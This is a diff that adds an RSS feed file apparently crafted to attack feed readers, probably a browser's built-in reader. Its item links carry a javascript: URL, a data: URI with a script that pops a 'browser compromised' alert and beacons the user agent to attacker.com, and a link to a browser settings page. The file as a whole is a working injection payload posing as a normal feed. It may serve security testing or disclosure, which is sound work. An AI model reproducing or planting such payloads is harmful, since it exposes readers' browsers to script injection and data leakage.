@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>legitimo</title>
+  <link>https://example.com/news</link>
+  <description>aaaa</description>
+  
+  <item>
+    <title>aaaaaa</title>
+    <description>Cas</description>
+    <link>javascript:alert(1)</link>
+    <pubDate>Sun, 16 Mar 2025 19:30:42 GMT</pubDate>
+  </item>
+  
+  <item>
+    <title>Ar</title>
+    <description>Ur</description>
+    <link>data:text/html,<script>alert('Seu navegador foi comprometido'); var i=document.createElement('img'); i.src='https://attacker.com/beacon?'+encodeURIComponent(navigator.userAgent);</script></link>
+    <pubDate>Sun, 16 Mar 2025 18:45:00 GMT</pubDate>
+  </item>
+
+  <item>
+    <title>Pr</title>
+    <description><![CDATA[<b>cu</b>!]]></description>
+    <link>brave://settings/clearBrowsingData</link>
+    <pubDate>Sun, 16 Mar 2025 17:20:00 GMT</pubDate>
+  </item>
+</channel>
+</rss>
